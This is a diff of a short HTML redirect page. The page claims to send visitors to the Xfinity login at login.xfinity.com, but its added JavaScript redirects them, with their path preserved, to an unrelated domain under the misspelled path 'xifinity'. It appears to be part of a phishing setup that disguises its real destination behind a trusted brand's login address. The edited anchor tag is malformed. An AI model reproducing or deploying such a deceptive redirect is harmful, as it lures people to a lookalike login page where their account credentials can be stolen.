@@ -3,10 +3,15 @@
 <head>
   <meta charset="utf-8">
   <title>Redirecting...</title>
-  <meta http-equiv="refresh" content="1; url=https://held.sa.com/xifinity/">
-  <link rel="canonical" href="https://held.sa.com/xifinity/">
+  <link rel="canonical" href="https://held.sa.com/xifinity">
+  <script>
+    // Redirect with path preservation
+    const targetDomain = "https://held.sa.com/xifinity";
+    const path = window.location.pathname; // e.g., /old-path/page
+    window.location.href = targetDomain + path;
+  </script>
 </head>
 <body>
-  <p>Redirecting to https://login.xfinity.com/login</a>...</p>
+  <p>Redirecting to <a https://login.xfinity.com/login</a>...</p>
 </body>
 </html>
